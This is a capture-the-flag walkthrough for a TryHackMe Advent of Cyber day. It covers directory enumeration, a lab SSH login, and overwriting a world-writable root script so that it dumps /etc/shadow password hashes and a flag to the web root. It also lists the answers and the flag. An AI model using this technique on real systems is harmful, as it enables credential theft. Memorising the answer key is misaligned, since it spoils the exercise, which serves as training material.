# TryHackMe [Advent of Cyber 3](https://tryhackme.com/room/adventofcyber3) Day 14
### References
* Alpha Cyber Security. (2021). TryHackMe Advent of Cyber - Day 14 [YouTube Video]. In YouTube. https://youtu.be/NJVGTVbmWKM

## How many pages did the `dirbuster` scan find with its default word list?
* 4 pages returned a successful (HTTP 2XX status) response:
```bash
$ gobuster dir -u http://<MACHINE_IP>/ -w /usr/share/dirb/wordlists/common.txt
/.hta                 (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/admin                (Status: 200) [Size: 363]
/index.html           (Status: 200) [Size: 169]
/server-status        (Status: 403) [Size: 278]
/warez                (Status: 200) [Size: 606]
```

**Answer**: `4`
## How many scripts do you see in the `/home/thegrinch/scripts` folder?
* The `loot.sh` script is editable by everyone:
```bash
$ ssh mcskidy@<MACHINE_IP>
mcskidy@<MACHINE_IP> password: Password1
mcskidy@ip-10-10-247-106:~$ cd /home/thegrinch/scripts
mcskidy@ip-10-10-247-106:/home/thegrinch/scripts$ ls -la
total 20
drwxr-xr-x 2 root      root      4096 Nov 11 20:03 .
drwxr-xr-x 7 thegrinch thegrinch 4096 Nov 11 19:50 ..
-rwx------ 1 root      root       286 Nov 11 20:03 check.sh
-rwx------ 1 root      root        58 Nov 11 09:00 cleanup.sh
-rwxrwxrwx 1 root      root        61 Nov 11 19:56 loot.sh
-rwx------ 1 root      root         0 Nov 11 07:58 test.sh
```

**Answer**: `4`
## What are the five characters following `$6$G` in `pepper`'s password hash?
1. Edit the `loot.sh` script to output the password hashes into the website's source code:
```bash
mcskidy@ip-10-10-247-106:/home/thegrinch/scripts$ cat loot.sh 
#!/bin/bash

ls /home/thegrinch/loot > /var/www/html/ls.html
mcskidy@ip-10-10-247-106:/home/thegrinch/scripts$ nano loot.sh 
mcskidy@ip-10-10-247-106:/home/thegrinch/scripts$ cat loot.sh 
#!/bin/bash
cat /etc/shadow > /var/www/html/ls.html
```
2. Refresh `http://<MACHINE_IP>/admin` and obtain the hashes:
```
root:*:18561:0:99999:7:::
daemon:*:18561:0:99999:7:::
bin:*:18561:0:99999:7:::
sys:*:18561:0:99999:7:::
sync:*:18561:0:99999:7:::
games:*:18561:0:99999:7:::
man:*:18561:0:99999:7:::
lp:*:18561:0:99999:7:::
mail:*:18561:0:99999:7:::
news:*:18561:0:99999:7:::
uucp:*:18561:0:99999:7:::
proxy:*:18561:0:99999:7:::
www-data:*:18561:0:99999:7:::
backup:*:18561:0:99999:7:::
list:*:18561:0:99999:7:::
irc:*:18561:0:99999:7:::
gnats:*:18561:0:99999:7:::
nobody:*:18561:0:99999:7:::
systemd-network:*:18561:0:99999:7:::
systemd-resolve:*:18561:0:99999:7:::
syslog:*:18561:0:99999:7:::
messagebus:*:18561:0:99999:7:::
_apt:*:18561:0:99999:7:::
lxd:*:18561:0:99999:7:::
uuidd:*:18561:0:99999:7:::
dnsmasq:*:18561:0:99999:7:::
landscape:*:18561:0:99999:7:::
sshd:*:18561:0:99999:7:::
pollinate:*:18561:0:99999:7:::
ubuntu:!:18942:0:99999:7:::
thegrinch:$6$iiajscL7$7YgS0mCSs8ROHgS/4VP1itLix.T7onR26n4gdHFNAYnF/jVY7N4No11Yuy2RtLwXxJE3Vzl6zBdXXu5GUBJCj0:18942:0:99999:7:::
mcskidy:$6$g81UcX1e$az/mXtNiOt9tMDb6lixDN3c1yH2GhcJVlAIWYB/WYNgujmxHafZdhD91ppxB.x7RIkH9DbpS6XQxe0piA2p2L1:18942:0:99999:7:::
pepper:$6$GZUP42Y2$QYDESrTO9T517RDzR6cGXOANA/H4For7odahhn/DUdeWfEXtG9ZLHnZl4PLbfm8WF0GRB4ti9ij6w0NwBPunI/:18942:0:99999:7:::
```

**Answer**: `ZUP42`
## What is the content of the `flag.txt` file on the Grinch's user’s desktop?
1. Edit the `loot.sh` script to output the flag into the website's source code:
```bash
mcskidy@ip-10-10-247-106:/home/thegrinch/scripts$ nano loot.sh 
mcskidy@ip-10-10-247-106:/home/thegrinch/scripts$ cat loot.sh 
#!/bin/bash
cat /home/thegrinch/Desktop/flag.txt > /var/www/html/ls.html
```
2. Refresh `http://<MACHINE_IP>/admin` and obtain the flag

**Flag**: `DI3H4rdIsTheBestX-masMovie!`